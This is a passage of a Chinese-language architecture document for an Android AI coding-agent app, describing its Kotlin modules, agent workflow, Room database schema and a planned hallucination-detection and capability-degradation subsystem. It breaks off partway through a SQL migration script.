# CodeCore-R 完整技术架构文档 v1.0
> 含现有代码结构详解 + ZTH 零幻觉容忍模式模块设计 + 模块关联图 + 精确函数签名
> 代码库根目录：[/workspace/deepcode-R](file:///workspace/deepcode-R)

---

## 目录

- [第 0 章 项目全景总览](#0-项目全景总览)
  - 0.1 技术栈与依赖
  - 0.2 顶层包结构
  - 0.3 分层架构图
- [第 1 章 Agent 核心工作流模块](#1-agent-核心工作流模块)
  - 1.1 包结构与类依赖
  - 1.2 StatefulAgentWorkflow 详解（1111 行核心）
  - 1.3 AgentSessionState 状态树
  - 1.4 AgentWorkflow 接口与事件系统
  - 1.5 与 ZTH 模块的挂接点
- [第 2 章 设置与模型元数据模块](#2-设置与模型元数据模块)
  - 2.1 包结构
  - 2.2 SettingsViewModel（1140 行）
  - 2.3 ProviderEditorScreen UI 组件
  - 2.4 ModelMetadataService 能力判定链
  - 2.5 CompatibilityPolicyRepository 兼容策略
  - 2.6 专用模型配置（Vision / Compaction / Default）
- [第 3 章 Room 数据库与持久化层](#3-room-数据库与持久化层)
  - 3.1 AgentDatabase 总览（SCHEMA v33）
  - 3.2 现有 12 张 Entity/DAO 详解
  - 3.3 MigrationLoader 文件迁移机制
  - 3.4 ZTH SCHEMA 升级 v33→v37 设计
- [第 4 章 Hilt DI 依赖注入模块](#4-hilt-di-依赖注入模块)
  - 4.1 AgentModule 全部 @Provides 清单
  - 4.2 双阶段 DB 构建兜底机制
  - 4.3 ZthModule 扩展设计
- [第 5 章 工具系统与权限](#5-工具系统与权限)
  - 5.1 ToolRegistry 15 个工具注册
  - 5.2 AgentTool / AbstractContextualTool 继承体系
  - 5.3 ToolPermissionManager + PolicyEngine
  - 5.4 AskUserQuestionTool 交互卡片
- [第 6 章 上下文压缩与检查点](#6-上下文压缩与检查点)
  - 6.1 ContextCompactor 现有实现（359 行）
  - 6.2 CheckpointManager 文件快照机制
  - 6.3 PlanApprovalManager 计划审查
- [第 7 章 ZTH 零幻觉容忍模式 · 完整模块设计](#7-zth-零幻觉容忍模式--完整模块设计)
  - 7.1 ZTH 包结构全景（7 子系统 40+ 文件）
  - 7.2 第一层：通用能力路由管线
  - 7.3 第二层：多级保真上下文压缩
  - 7.4 第三层：四方联动状态机
  - 7.5 ZthFacade 门面模式封装
- [第 8 章 模块间关联图与数据流](#8-模块间关联图与数据流)
  - 8.1 主流程时序图（用户发消息 → 模型响应）
  - 8.2 失败降级路径时序图
  - 8.3 ZTH 四方联动数据流
  - 8.4 UI → ViewModel → Domain → Data 调用链
- [第 9 章 精确类/接口/函数签名总表](#9-精确类接口函数签名总表)
  - 9.1 现有核心类完整签名
  - 9.2 ZTH 新增类完整签名
  - 9.3 DAO 接口完整清单
  - 9.4 Composable UI 组件清单
- [第 10 章 钩子落点与改造清单](#10-钩子落点与改造清单)
  - 10.1 StatefulAgentWorkflow 改造点
  - 10.2 ContextCompactor 包装改造
  - 10.3 ProviderEditorScreen UI 替换
  - 10.4 SettingsViewModel Flow 扩展
  - 10.5 AgentModule DI 参数扩展

---

## 0. 项目全景总览

### 0.1 技术栈与依赖

| 类别 | 技术 | 版本/说明 |
|---|---|---|
| 语言 | Kotlin | 100% Kotlin 代码 |
| UI 框架 | Jetpack Compose | Material3 + ExperimentalMaterial3 |
| 架构模式 | MVVM + Clean Architecture + Hilt DI | ViewModel → UseCase/Domain → Repository → DAO/Remote |
| 数据库 | Room | SCHEMA v33，12 张表，文件 SQL 迁移 |
| 异步 | Kotlin Coroutines + Flow | StateFlow / SharedFlow / suspendCancellableCoroutine |
| 网络 | Retrofit + OkHttp | 120s 流式超时，3 个 Retrofit 实例（OpenAI/Anthropic/Gemini） |
| 序列化 | Gson + kotlinx.serialization JSON | Proto DataStore（ZTH 新增） |
| 容器 | PRoot + Alpine Rootfs | 本地 Linux 容器引擎 + 远程 SSH |
| 终端 | Termux Emulator + View | 独立 terminal-emulator / terminal-view 模块 |
| 打包 | Gradle + AGP | multi-module（app / terminal-emulator / terminal-view） |

### 0.2 顶层包结构（`com.R.codecore`）

```
com.R.codecore
├─ core/                               ← 跨 feature 通用能力
│  ├─ db/MigrationLoader.kt             32 份 SQL 文件迁移加载器
│  ├─ security/                         DEK/HostKey/Credential 加密套件（4 文件）
│  ├─ theme/                            Compose 主题与组件（AIEditorTheme / AppComponents）
│  ├─ util/                             AILogger / FileLogger / ErrorUtils / LineDiff 等
│  └─ worker/                           WorkManager 后台任务（AuditPurge / CredentialRotation / V1toV2）
│
├─ di/                                 ← Hilt 模块
│  ├─ AgentModule.kt                    核心 @Provides（DB / API / 工具 / Workflow，412 行）
│  ├─ BackupModule.kt                   备份还原模块
│  └─ RepositoryModule.kt               Repository 提供
│
├─ feature/
│  ├─ agent/                            ← AI Agent 核心（最大模块）
│  │  ├─ data/
│  │  │  ├─ local/
│  │  │  │  ├─ database/AgentDatabase.kt
│  │  │  │  ├─ dao/                     7 个 DAO 接口
│  │  │  │  └─ entity/                  12 个 Entity
│  │  │  └─ remote/                     openai/anthropic/gemini Retrofit API
│  │  ├─ domain/
│  │  │  ├─ model/                      ChatSession / AgentMessage / CodeChange / WorkflowResult
│  │  │  ├─ container/                  LinuxContainerEngine / SSH / CommandEngine
│  │  │  ├─ tool/                       15 个工具 + ToolRegistry / Permission 体系
│  │  │  ├─ prompt/SystemPromptProvider 静态 9 份 prompt + Plan/Auto/动态组装
│  │  │  ├─ checkpoint/CheckpointManager 文件快照 + CheckpointDao
│  │  │  ├─ session/                    SessionUseCase / MessagePersistenceUseCase
│  │  │  └─ workflow/                   StatefulAgentWorkflow / ContextCompactor / AgentWorkflow 接口
│  │  └─ presentation/
│  │     ├─ AIAgentViewModel.kt         1207 行 ViewModel（会话/消息/工具/权限/计划/检查点）
│  │     ├─ AgentUiModels.kt            AgentUIState / AgentUIMessage / 枚举
│  │     └─ component/                  AIChatPanel / ChatInputBar / 消息气泡 / PlanApprovalPanel
│  │
│  ├─ settings/                         ← 设置页
│  │  ├─ data/
│  │  │  ├─ local/dao/AIProviderDao
│  │  │  ├─ remote/ModelApiService / ModelMetadataService
│  │  │  └─ repository/                 AIProviderRepository / VisionModelSettingsRepository
│  │  │                                  CompactionModelSettingsRepository / DefaultModelSettingsRepository
│  │  │                                  CompatibilityPolicyRepository（RC63 新增）
│  │  ├─ domain/model/                  AIProviderConfig / ProviderType 枚举
│  │  └─ presentation/
│  │     ├─ SettingsViewModel.kt        1140 行
│  │     └─ component/                  SettingsScreen / ProviderEditorScreen / ProviderModelComponents
│  │
│  ├─ credentials/                      Git 凭证 + 加密
│  ├─ workspace/                        文件访问 + 远程 SSH/SFTP + 容器配置
│  ├─ terminal/                         Termux 封装（TerminalSessionManager）
│  └─ skills/                           Skill 加载与执行
│
├─ AIEditorApp.kt                       Application 类 + Hilt_GeneratedInjector
└─ MainActivity.kt                      单 Activity + NavHost 路由
```

### 0.3 分层架构图

```
┌─────────────────────────────────────────────────────────────────────┐
│                    UI Layer (Composable)                            │
│  AIChatPanel · SettingsScreen · ProviderEditorScreen · PlanPanel    │
└────────────────────────────┬────────────────────────────────────────┘
                             │ 收集 StateFlow / 发送 Action
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│                  ViewModel Layer (Hilt @HiltViewModel)               │
│  AIAgentViewModel(1207行) · SettingsViewModel(1140行)                │
└────────────────────────────┬────────────────────────────────────────┘
                             │ 调用 Domain 接口 / 注入 Repository
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│                  Domain Layer (纯 Kotlin，无 Android 依赖)            │
│  ┌──────────────────┐  ┌────────────────┐  ┌─────────────────────┐ │
│  │ StatefulAgent    │  │ ToolRegistry   │  │ SystemPromptProvider│ │
│  │ Workflow (1111)  │  │ (15 Tools)     │  │ (9 Prompts)         │ │
│  └────────┬─────────┘  └───────┬────────┘  └──────────┬──────────┘ │
│           │                    │                      │            │
│  ┌────────▼─────────┐  ┌───────▼────────┐  ┌──────────▼──────────┐ │
│  │ ContextCompactor │  │ Permission Mgr │  │ CheckpointManager   │ │
│  └────────┬─────────┘  └───────┬────────┘  └──────────┬──────────┘ │
│           │                    │                      │            │
│  ┌────────▼────────────────────▼──────────────────────▼──────────┐ │
│  │            UseCase: SessionUseCase / MessagePersistence         │ │
│  └────────────────────────────┬───────────────────────────────────┘ │
└───────────────────────────────┼─────────────────────────────────────┘
                                │ 调用 DAO / Retrofit API
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│                  Data Layer (Room + Retrofit + DataStore)            │
│  Room (12表) · Retrofit(3实例) · Proto/Preferences DataStore         │
└─────────────────────────────────────────────────────────────────────┘

         横切关注点：ZTH 零幻觉容忍模式（以门面 ZthFacade 挂入 Domain 层）
         ┌──────────────────────────────────────────────────┐
         │  ZthFacade ── 封装 7 子系统供 Workflow/ViewModel 调用 │
         │    ├─ CapabilityDetector 能力识别                  │
         │    ├─ DegradationChainExecutor 降级链执行           │
         │    ├─ CompactionPipeline (L0/L1/L2)               │
         │    ├─ HallucinationCircuitBreaker 熔断             │
         │    ├─ 4 Coordinator 四方联动                        │
         │    ├─ ZthLlmMessageBuilder 消息过滤                │
         │    └─ ZthConfirmationCardViewModel 卡片阻塞        │
         └──────────────────────────────────────────────────┘
```

---

## 1. Agent 核心工作流模块

### 1.1 包结构与类依赖

```
feature/agent
├─ domain/workflow
│  ├─ AgentWorkflow.kt                ← 接口 + AgentEvent 密封类（85 行）
│  └─ StatefulAgentWorkflow.kt        ← 实现类（1111 行，核心）
│
├─ domain/model
│  ├─ ChatSession.kt                  ← AgentMode 枚举 + ChatSession data class
│  ├─ AgentMessage.kt                 ← 消息模型 + MessageRole
│  ├─ CodeChange.kt                   ← ChangeType + WorkflowStatus + WorkflowResult
│  └─ AgentContext.kt                 ← Tool 执行上下文（会话/消息/权限/工作区）
│
├─ domain/checkpoint
│  └─ CheckpointManager.kt            ← 文件快照 + Checkpoint 创建（147 行）
│
├─ domain/tool/mode
│  └─ PlanApprovalManager.kt          ← 计划审查挂起/恢复（74 行）
│
├─ domain/session
│  ├─ SessionUseCase.kt               ← 会话 CRUD + Token 统计
│  └─ MessagePersistenceUseCase.kt    ← 消息加载/持久化/压缩标记处理
│
├─ presentation
│  ├─ AIAgentViewModel.kt             ← 1207 行（会话/消息/工具/权限/计划/检查点）
│  ├─ AgentUiModels.kt                ← AgentUIState / AgentUIMessage / RetryState
│  └─ component/
│     ├─ AIChatPanel.kt               ← 聊天主面板（625 行）
│     ├─ ChatInputBar.kt              ← 输入栏 + PlanApprovalPanel（704 行）
│     └─ MessageBubble.kt 等
│
└─ data
   ├─ local/(dao + entity + database)
   └─ remote/(openai + anthropic + gemini Retrofit API)
```

### 1.2 StatefulAgentWorkflow 详解（1111 行核心）

#### 1.2.1 构造函数与注入（67~117 行）

```kotlin
@Inject constructor(
    // ---- 工具系统 ----
    toolRegistry: ToolRegistry,
    permissionManager: ToolPermissionManager,
    policyEngine: ToolPermissionPolicyEngine,
    toolOutputStore: ToolOutputStore,
    // ---- Provider 与 API ----
    aiProviderRepository: AIProviderRepository,
    openAIApi: OpenAIApi,
    anthropicApi: AnthropicApi,
    geminiApi: GeminiApi,
    modelMetadataService: ModelMetadataService,
    // ---- Prompt ----
    promptProvider: SystemPromptProvider,
    // ---- 压缩与检查点 ----
    contextCompactor: ContextCompactor,
    checkpointManager: CheckpointManager,
    // ---- 专用模型配置 ----
    visionModelSettingsRepository: VisionModelSettingsRepository,
    compactionModelSettingsRepository: CompactionModelSettingsRepository,
    // ---- RC63 兼容策略（ZTH 直接复用） ----
    compatibilityPolicyRepository: CompatibilityPolicyRepository,
    // ---- 会话持久化 ----
    sessionUseCase: SessionUseCase,
    messagePersistenceUseCase: MessagePersistenceUseCase
)
```

#### 1.2.2 核心函数一览

| 函数名 | 签名 | 说明 | ZTH 挂接点 |
|---|---|---|---|
| `processUserTurn` | `suspend fun(sessionId, userPrompt, images, mode, onEvent): WorkflowResult` | 主入口：用户发消息后的完整一轮执行 | ✅ 开头注入 CapabilityDetector.detect()；替换直接 CallLlm 为 DegradationChainExecutor |
| `buildAgentContext` | `private fun(sessionId, messages, mode, provider, model): AgentContext` | 构造工具执行上下文 | 无改动 |
| `compactIfNeeded` | `private suspend fun(...)` | 调用 ContextCompactor | ✅ 改为内部包装 ZTH CompactionPipeline |
| `callLlm` | `private suspend fun(messages, provider, model, stream, includeTools, includeReasoning, retryPolicy): RawLlmResponse` | 核心 LLM 调用（try-catch vision 降级位置） | ✅ 替换硬编码 VISION_UNSUPPORTED_HINTS 为 FailureClassifier.classify() + ZthDecisionMatrix 查表 |
| `runVisionFallback` | `private suspend fun(...)` | RC64 独立识图模型兜底 | 保留 + 扩展为通用 DegradationChainExecutor 的 VISION resolver#2 |
| `resolveProviderConfig` | `private suspend fun(sessionId?): Pair<AIProviderConfig, ProviderConfig>?` | 解析当前 Provider/Model | 无改动 |
| `activeModelSupportsVision` | `private suspend fun(sessionId?): Boolean` | 判断当前模型是否支持视觉 | ✅ 返回值同时写入 metadata.inferenceReason，供 ZTH 审计追踪 |
| `executeToolCall` | `private suspend fun(call, context, onEvent): ToolResult` | 单个工具调用 + 权限 + AskUserQuestion 阻塞 | 无改动 |
| `buildSystemPrompt` | `private fun(ctx, includeTools, provider): String` | 组装系统 prompt | ✅ 对 sentinel 带 planRejectedCount 的条目自动追加 ⚠️ 前缀（LINK-INV-1） |

#### 1.2.3 AgentSessionState 不可变状态树（117~150 行）

```kotlin
data class AgentSessionState(
    val messages: List<AgentMessage> = emptyList(),
    val iterations: Int = 0,
    val isFinished: Boolean = false,
    val error: String? = null,
    val mode: AgentMode = AgentMode.BUILD,
    // ---- RC64 vision 降级状态标志 ----
    val visionFallbackRetried: Boolean = false,  // 防止自动降级死循环
    // ---- ZTH 新增字段（LINK-INV 一致性） ----
    val fuseScoreSnapshot: Int = 0,              // CB 分（与 AgentSessionEntity 同步）
    val fuseCriticalHits: Int = 0,               // CRITICAL 命中数
    val fuseState: FuseState = FuseState.CLOSED, // 6 态枚举
    val pendingCardIds: List<String> = emptyList(),  // LINK-INV-3 还原前关 Card
    val pendingPlanApprovalId: Long? = null,     // LINK-INV-3 还原前关 Plan
    val restoredL0MessageIds: Set<String> = emptySet() // REV-INV-2 绿 badge
)
```

### 1.3 AgentWorkflow 接口与事件系统（AgentEvent 密封类）

```kotlin
sealed class AgentEvent {
    data class AssistantText(content, toolCalls, reasoning, signature, inputTokens, outputTokens)
    data class AssistantDelta(accumulated: String)                 // 流式文本增量
    data class ReasoningDelta(accumulated: String)                 // 流式思考增量
    data class ToolCallStarted(id, toolName, argsPreview)
    data class ToolCallProgress(id, toolName, accumulated)         // 流式工具
    data class ToolCallFinished(id, toolName, result, isError, argsPreview, attachments)
    data class Retrying(attempt, maxRetries)                       // 重试 UI 提示
    data class CompactionStarted(estimatedTokens)                  // 压缩 UI 提示
    object CompactionFinished
    // ---- ZTH 新增事件类型 ----
    data class ZthCardShown(cardId, density, capability)           // 出卡事件（UI 打开 Dialog）
    data class ZthCardResolved(cardId, confirmed: Boolean, sentinelId?) // 卡关闭事件
    data class ZthFuseStateChanged(newState, score, criticalHits)  // 熔断状态变化（横幅刷新）
    data class ZthCompactionL0Triggered(tokensSaved, badgeVisible) // L0 badge 显示
    data class ZthPlanRejectedAutomatically(reason: String)        // LINK-INV-2 自动拒 Plan
}

interface AgentWorkflow {
    suspend fun processUserTurn(
        sessionId: String,
        userPrompt: String,
        images: List<AgentImage>,
        mode: AgentMode,
        onEvent: suspend (AgentEvent) -> Unit
    ): WorkflowResult

    suspend fun interrupt(sessionId: String)
}
```

### 1.4 与 ZTH 模块的挂接点（精确到行级改造）

| 位置（现有函数） | 改造内容 | ZTH 调用 |
|---|---|---|
| `processUserTurn` 开头，buildContext 之前 | 新增能力检测 | `zthFacade.capabilityDetector.detect(sessionState, userMsg) → Set<RequiredCapability>` |
| `processUserTurn` 主循环，每次 LLM 调用前 | 根据 RequiredCapability 构造降级请求 | `zthFacade.chainExecutor.execute(req) → DegradationResult`（可能阻塞出卡片） |
| `callLlm` try-catch 块 catch(e) 分支 | 替换现有 VISION_UNSUPPORTED_HINTS 硬编码 | `zthFacade.failureClassifier.classify(e, ctx)` → 查 ZthDecisionMatrix → 走标准动作链 |
| `callLlm` 返回前，LLM 原始输出 → 下一循环前 | 新增幻觉检测 + 熔断加分 | `zthFacade.hallucinationClassifier.assess(rawOutput, ctx)` → scoreDelta → 若需出卡则阻塞 |
| `compactIfNeeded` 调用点 | 保留函数签名，内部委托 | `zthFacade.compactionPipeline.compactIfNeeded(...)`（L0→L1→L2 升级式） |
| `buildSystemPrompt` 末尾 | 新增 sentinel plan rejection 前缀注入 | `zthFacade.planRejectionSentinel.enrich(prompt, sessionId)`（LINK-INV-1） |
| LLM 调用 messages 组装处（3 处：主模型/压缩模型/vision 兜底） | 统一走消息过滤 | `zthFacade.messageBuilder.build(rawMessages, PRIMARY_LLM)`（MSG-INV-3/4 强制执行） |

---

## 2. 设置与模型元数据模块

### 2.1 包结构

```
feature/settings
├─ data/
│  ├─ local/
│  │  ├─ dao/AIProviderDao.kt             Provider CRUD
│  │  └─ entity/AIProviderEntity.kt
│  ├─ remote/
│  │  ├─ ModelApiService.kt                拉取模型列表 / 测试连接
│  │  └─ ModelMetadataService.kt           （372 行）能力判定核心链：catalog → default → 策略 → 覆盖
│  └─ repository/
│     ├─ AIProviderRepository.kt           Provider 业务操作
│     ├─ VisionModelSettingsRepository.kt  识图专用 provider/model（DataStore）
│     ├─ CompactionModelSettingsRepository.kt 压缩专用模型配置
│     ├─ DefaultModelSettingsRepository.kt 新会话默认模型
│     ├─ CompatibilityPolicyRepository.kt （RC63）全局兼容端点策略 + 自动降级 + viewImage 守卫
│     ├─ ExecutionModeRepository.kt        本地/远程容器模式
│     ├─ LogSettingsRepository.kt          日志级别
│     ├─ ThemeSettingsRepository.kt        主题
│     ├─ KeepaliveSettingsRepository.kt    常驻通知
│     └─ LanguageSettingsRepository.kt     语言
│
├─ domain/model/AIProviderConfig.kt        ProviderType(OPENAI/ANTHROPIC/GEMINI) 枚举
│
└─ presentation/
   ├─ SettingsViewModel.kt                 1140 行
   └─ component/
      ├─ SettingsScreen.kt                 792 行主设置页（含菜单分段跳转）
      ├─ ProviderEditorScreen.kt           857 行 Provider 编辑（模型列表 + 能力覆盖 + 兼容策略）
      └─ ProviderModelComponents.kt        ProviderModelRow + CapabilityOverridePanel（③④ UI）
```

### 2.2 SettingsViewModel（1140 行）核心 Flow / Setter

#### 2.2.1 现有 Flow 清单（ZTH 直接使用 + 扩展）

```kotlin
// Provider 相关
val providers: StateFlow<List<AIProviderConfig>>
val activeProvider: StateFlow<AIProviderConfig?>

// 模型元数据（ProviderEditor 角标用）
val modelMetadata: StateFlow<Map<String, ModelMetadata>>

// 专用模型设置（Vison/Compaction 被 ZTH ResolverResolver 复用）
val visionProviderId: StateFlow<String>
val visionModel: StateFlow<String>
val compactionProviderId: StateFlow<String>
val compactionModel: StateFlow<String>

// RC63 兼容端点策略（ZTH 第一层路由的全局预设来源）
val compatibilityDefaultPolicyFlow: StateFlow<DefaultPolicy>
val autoDowngradeOnSendFailureFlow: StateFlow<Boolean>
val viewImageUnknownGuardPolicyFlow: StateFlow<ViewImageUnknownGuardPolicy>

// ---- ZTH 新增 Flow（Section 1/2/3 UI 数据源） ----
// Section 1 预设选择
val zthActivePresetFlow: StateFlow<PresetId>

// Section 2 能力链概览（Per-Provider，key = providerId）
val zthChainSpecsPerProviderFlow: StateFlow<Map<String, CompatibilityChainSpecs>>

// Section 2.5 熔断仪表盘（key = sessionId）
val zthFuseDashboardFlow: (String) -> Flow<FuseDashboardData>

// Section MANUAL 档参数快照
val zthParamsSnapshotFlow: StateFlow<ZthParamsSnapshot>

// ---- ZTH 新增 Setter（UI 操作写入） ----
suspend fun selectZthPreset(preset: PresetId, applyToAllProviders: Boolean)
suspend fun saveResolverEdit(providerId: String, capability: String, newSpec: ChainSpec)
suspend fun saveZthParamsEdit(newSnapshot: ZthParamsSnapshot)
suspend fun resetCurrentSessionFuseScore(sessionId: String)  // 仅 MANUAL + 高级
```

### 2.3 ProviderEditorScreen ZTH UI 三段式替换

现有 RC63 区块位置：ProviderEditorScreen 底部（CompatibilityPolicyDropdown + 2 个 Switch）

**ZTH 替换后结构（Section 1/2/3 顺序）**：

```
ProviderEditorScreen
├─ ... 现有上半部分（名称/Key/BaseUrl/类型 · 模型列表 · 测试连接）...
│
├─ ══ ZTH Section 1：预设选择（ZthPresetSelector.kt）══
│  RadioGroup 4 选项：
│  ├─ STRICT：严格模式——关闭视觉自动降级/压缩，任何不确定都直接失败
│  ├─ ⭐ BALANCED（默认）：平衡——启发式白名单 + 60/120 熔断
│  ├─ LAX：宽松——100/200 熔断 + 复用更激进
│  └─ MANUAL：高级手动——齿轮编辑 Resolver/参数
│  切换预设时 Dialog：「是否应用到所有已配置 Provider？ 是/仅本 Provider/取消」
│
├─ ══ ZTH Section 2：能力链总览（ZthCapabilityChainOverviewCard.kt）══
│  LazyColumn 5 行，每行结构：
│  ┌──────────────────────────────────────────────────────────┐
│  │ [Switch] 识图（Vision）    主模型 → 专用识图模型 → [兜底]  │
│  │          熔断分: +10/次    长度:2   [⚙️]（MANUAL 才显）    │
│  └──────────────────────────────────────────────────────────┘
│  5 行 = VISION / CONTEXT_COMPACTION / TOOL_RICH / REASONING / STREAMING_REALTIME
│  注意：TOOL_RICH 和 REASONING 行右侧 🛡️ZTH badge，链长度固定=1（不可改）
│
└─ ══ ZTH Section 3：熔断仪表盘（ZthFuseDashboard.kt）══
   只读卡片（所有预设可见）：
   ┌──────────────────────────────────────────────────────────┐
   │ 当前会话熔断：🟢 CLOSED    分数 0/120    CRITICAL 命中 0    │
   │ 历史 OPEN 次数：2 次  [📝 查看熔断日志]                    │
   │ [MANUAL 专属] ⚠️ 重置本会话熔断分（免责声明按钮）            │
   └──────────────────────────────────────────────────────────┘
```

### 2.4 ModelMetadataService 能力判定链（372 行，ZTH 只读复用）

```kotlin
// 判定优先级顺序（从高到低，ZTH 不改顺序，仅在 ResolverResolver 中复用结果）
suspend fun resolve(type: ProviderType, modelId: String): ModelMetadata {
    // Step 1: MODELS_DEV catalog 远程（或缓存/内置 assets）查找
    val base = findMetadata(loadCatalog(), type, modelId)
        ?: default(type, modelId)  // Step 2: 内置启发式白名单（step- 家族命中此处）

    // Step 3: 兼容端点策略应用（source=INFERRED 才生效）
    // Step 4: 单模型复选框手动覆盖（优先级最高，ModelCapabilityOverrideDao 查询）
    return applyCompatibilityPolicies(base, type, modelId)
}

// 返回值带审计字段 inferenceReason，ZTH 直接写入 sentinel 溯源
data class ModelMetadata(
    val id: String,
    val displayName: String,
    val supportsVision: Boolean,
    val supportsToolCalling: Boolean,
    val supportsReasoning: Boolean,
    val contextTokens: Int,
    val source: MetadataSource,            // MODELS_DEV / INFERRED / OVERRIDE
    val inferenceReason: String            // 新增：判定原因 JSON（便于 ZTH 审计）
)
```

### 2.5 CompatibilityPolicyRepository 全局策略（Package 级别枚举）

```kotlin
// 枚举（Package 级别，解决 RC64b 嵌套枚举可见性问题）
enum class DefaultPolicy { STRICT, HEURISTIC, LAX, MANUAL }
enum class ViewImageUnknownGuardPolicy { FALLBACK_VISION_MODEL, FAIL_FAST }

// 3 个 Flow（SettingsViewModel 直接 collectAsState）：
val defaultPolicyFlow: Flow<DefaultPolicy>
val autoDowngradeOnSendFailureFlow: Flow<Boolean>
val viewImageUnknownGuardPolicyFlow: Flow<ViewImageUnknownGuardPolicy>

// 3 个 suspend setter：
suspend fun setDefaultPolicy(policy: DefaultPolicy)
suspend fun setAutoDowngrade(enabled: Boolean)
suspend fun setViewImageUnknownGuardPolicy(policy: ViewImageUnknownGuardPolicy)
```

### 2.6 三个专用模型 DataStore Repository 结构对比

| Repository | DataStore 名 | Key 1 | Key 2 | ZTH Resolver 用途 |
|---|---|---|---|---|
| VisionModelSettingsRepository | `visionModelDataStore` | `vision_provider_id` | `vision_model` | `DEDICATED_VISION_LLM` Resolver |
| CompactionModelSettingsRepository | `compactionModelDataStore` | `compaction_provider_id` | `compaction_model` | `DEDICATED_COMPACT_LLM` Resolver |
| DefaultModelSettingsRepository | `defaultModelDataStore` | `default_provider_id` | `default_model` | 新会话初始 Provider |

**统一接口模式（ZTH 封装 ResolverResolver 时复用）**：
```kotlin
val providerIdFlow: Flow<String>      // UI observe
val modelFlow: Flow<String>
suspend fun setXxxModel(providerId: String, model: String)  // UI 写入
suspend fun getXxxProviderId(): String  // 冷读
suspend fun getXxxModel(): String
```

---

## 3. Room 数据库与持久化层

### 3.1 AgentDatabase 总览（SCHEMA v33 → ZTH v37）

```kotlin
@Database(
    entities = [
        // ---- v33 原有 12 张 ----
        AgentMessageEntity::class,
        ChatSessionEntity::class,
        AIProviderEntity::class,
        RemoteConnectionEntity::class,
        RemoteMountEntity::class,
        TodoItemEntity::class,
        GitCredentialEntity::class,
        CheckpointEntity::class,
        CheckpointFileSnapshotEntity::class,
        CredentialEncryptionStateEntity::class,
        RemoteAuditLogEntity::class,
        ModelCapabilityOverrideEntity::class,   // RC63 新增

        // ---- ZTH v34 新增 2 张 ----
        UserConfirmedSentinelEntity::class,     // Layer 5 用户确认哨兵（MSG-INV-1 追加写）
        SentinelPlanRejectionAudit::class,      // LINK-INV-1 审计

        // ---- ZTH v35 新增 3 张 ----
        HardConstraintDeleteAudit::class,       // DEL-2 硬删除审计（Trade-off #12）
        L0SoftCompactRestoreLogEntity::class,   // REV-INV-2 L0 单条还原日志
        HallucinationFuseEntity::class          // LINK-INV-4 永久锁 + 事件日志
    ],
    version = 37,  // ZTH：v33 → 34 → 35 → 36（空步）→ 37（升级列）
    exportSchema = true
)
```

### 3.2 v33 现有 12 张 Entity/DAO 详解

#### 3.2.1 核心业务表（6 张）

| 表名 | Entity | DAO | 主键 | 主要列 | 用途 |
|---|---|---|---|---|---|
| `chat_sessions` | ChatSessionEntity | ChatSessionDao | id TEXT | title, workspacePath, mode, reasoningEffort, providerId, model, totalI/O tokens, lastInputTokens | 聊天会话 |
| `agent_messages` | AgentMessageEntity | AgentMessageDao | id TEXT | sessionId, role, content, timestamp, toolName, toolArgs, isError, reasoning, isCompacted, isCompactionMarker, isBackgroundNotification, inputTokens, outputTokens, signature | 消息列表 |
| `todo_items` | TodoItemEntity | TodoItemDao | id TEXT | sessionId, subject, description, status, priority, `order`, createdAt, updatedAt | 任务清单 |
| `plan_approval_entity` | PlanApprovalEntity | (ZTH 新增 DAO) | id LONG | sessionId, planJson, status, createdAt, checkpointId(ZTH), rejectedDueToFuseOpen(ZTH), autoRejectedReason(ZTH), planItemSourceRefsJson(ZTH) | 计划审批 |
| `checkpoint_entity` | CheckpointEntity | CheckpointDao | id TEXT | sessionId, userMessageId, promptSnippet, createdAt, fuseScoreAtSave(ZTH), fuseCriticalHitsAtSave(ZTH), checkpointHasCriticalHit(ZTH), checkpointType(ZTH), pendingCardIdsJson(ZTH), pendingPlanApprovalId(ZTH), restoredL0MessageIdsJson(ZTH) | 检查点 |
| `checkpoint_file_snapshot_entity` | CheckpointFileSnapshotEntity | （内聚）| id LONG | checkpointId FK, filePath, snapshotFileName, changeType, originalSize | 文件快照 |

#### 3.2.2 设置与配置表（4 张）

| 表名 | Entity | DAO | 主键 | 用途 |
|---|---|---|---|---|
| `ai_providers` | AIProviderEntity | AIProviderDao | id TEXT | Provider 配置（name/type/apiKey/baseUrl/models/isEnabled） |
| `model_capability_overrides` | ModelCapabilityOverrideEntity | ModelCapabilityOverrideDao | providerType+modelId | 单模型能力手动覆盖（supportsVision/supportsTools/supportsReasoning 3 复选框） |
| `git_credential_entity` | GitCredentialEntity | GitCredentialDao | id | HTTPS/SSH 凭证加密存储 |
| `credential_encryption_state_entity` | CredentialEncryptionStateEntity | CredentialEncryptionStateDao | id TEXT | DEK 轮换状态 |

#### 3.2.3 远程与审计表（2 张）

| 表名 | Entity | DAO | 用途 |
|---|---|---|---|
| `remote_connection_entity` + `remote_mount_entity` | RemoteConnectionEntity + RemoteMountEntity | RemoteConnectionDao | SSH 主机 + 挂载路径 |
| `remote_audit_log_entity` | RemoteAuditLogEntity | RemoteAuditLogDao | 远程连接审计日志 |

### 3.3 MigrationLoader 文件迁移机制（99 行）

```kotlin
// 流程：
// 1. AgentDatabase.build → addMigrations(*MigrationLoader.loadMigrations(context))
// 2. loadMigrations 读取 assets/migrations/ 目录下的 N_add_xxx.sql 文件
// 3. 按文件名前缀数字排序，依次包装为 FileMigration(N, scriptName, sqlStatements)
// 4. 进程级缓存（cached: Array<Migration>），避免冷启动重复走 AssetManager
// 5. 每个 FileMigration.migrate() 自动写 migration_history 表
```

**现有 assets/migrations/ 32 份 SQL 编号说明**：
```
8_add_remote_servers.sql
9_add_remote_connections_and_mounts.sql
...
28_add_checkpoint_tables.sql
29_add_session_reasoning_effort.sql
30_add_message_signature.sql
31_add_encrypted_fields.sql
32_add_credential_encryption_state.sql
```

**ZTH 新增 4 份迁移脚本命名**：
```
33_zth_v34_sentinel_plan_audit.sql    → v33→34：建 user_confirmed_sentinel + sentinel_plan_rejection_audit
34_zth_v35_3audit_fuse.sql            → v34→35：建 hard_constraint_delete_audit + l0_soft_compact_restore_log + hallucination_fuse_entity
35_zth_v36_empty_step.sql             → v35→36：空步占位
36_zth_v37_upgrade_3tables_13cols.sql → v36→37：ALTER TABLE agent_session/plan_approval/checkpoint 加 13 列
```

### 3.4 ZTH SCHEMA 升级 v33→v37 完整 SQL

#### v33→34（2 张新表）
```sql
-- 33_zth_v34_sentinel_plan_audit.sql
CREATE TABLE user_confirmed_sentinel (
  id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
  session_id TEXT NOT NULL,
